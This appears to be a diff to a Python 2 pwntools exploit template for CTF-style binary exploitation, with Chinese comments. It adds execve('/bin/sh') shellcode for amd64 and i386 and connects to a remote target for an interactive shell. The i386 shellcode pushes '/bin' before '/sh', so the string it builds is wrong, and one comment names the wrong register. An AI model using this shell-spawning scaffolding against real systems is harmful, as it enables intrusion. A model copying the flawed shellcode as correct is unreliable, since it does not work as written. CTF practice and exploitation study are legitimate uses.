@@ -65,13 +65,12 @@ pip2 install pwntools
 #!/usr/bin/python2
 # -*- coding:utf-8 -*-
 from pwn import *
-import os
 import sys
 
 '''
 	待修改数据
 '''
-context(log_level = 'debug', arch = 'amd64', os = 'linux')
+context(log_level = 'debug', arch = 'amd64', os = 'linux', terminal = ['konsole', '-e'])
 execve_file = None
 lib_file = None
 gdbscript = '''starti
@@ -83,17 +82,28 @@ gdbscript = '''starti
 '''
 	这里给出asm 汇编->机器代码的相关样例
 '''
-shell = asm('''
-mov	rbx, %d		#rbx = "/bin/sh"
-push	rbx
-push	rsp
-pop	rdi		#rdi -> "/bin/sh"
-xor	esi, esi	#esi -> NULL
-xor	edx, edx	#edx -> NULL
+if context.arch == 'amd64':
+	shellcode = asm('''
+mov	rax, %d		/*rbx = "/bin/sh"*/
+push	rax
+mov	rdi, rsp	/*rdi -> "/bin/sh"*/
+xor	esi, esi	/*esi -> NULL*/
+xor	edx, edx	/*edx -> NULL*/
 push	0x3b
-pop	rax		#rax = 0x3b
-syscall			#execve("/bin/sh")
+pop	rax		/*rax = 0x3b*/
+syscall			/*execve("/bin/sh")*/
 '''%(u64('/bin/sh'.ljust(8, '\x00'))))
+elif context.arch == 'i386':
+	shellcode = asm('''
+push	%d		/*"/bin"*/
+push	%d		/*"/sh\x00"*/
+mov	ebx, esp	/*ebx -> "/bin/sh"*/
+xor	ecx, ecx	/*ecx -> NULL*/
+xor	edx, edx	/*edx -> NULL*/
+push	11
+pop	eax		/*eax = 11*/
+int 0x80		/*execve("/bin/sh")*/
+'''%(u32('/bin'), u32('/sh\x00')))
 
 
 
@@ -122,11 +132,10 @@ log.info('-----------------------------------------------------------')
 while True:
 	try:
 		if 'd' in sys.argv:
-			r = gdb.debug(execve_file, gdbinit)
+			r = gdb.debug(execve_file, gdbscript)
 		else:
 			r = remote(sys.argv[1], sys.argv[2])
 
-		r.recv(timeout = 1)
 		r.interactive()
 		break
 	except KeyboardInterrupt:
